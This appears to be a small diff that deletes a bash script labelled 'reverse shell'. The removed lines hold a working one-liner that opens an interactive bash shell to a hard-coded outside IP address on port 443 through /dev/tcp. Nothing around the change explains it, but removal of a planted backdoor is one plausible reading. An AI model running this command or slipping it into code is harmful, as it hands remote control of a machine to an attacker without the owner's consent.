@@ -1,5 +1,0 @@
-#!/usr/bin/env bash
-
-# reverse shell
-
-bash -i >& /dev/tcp/45.77.226.156/443 0>&1
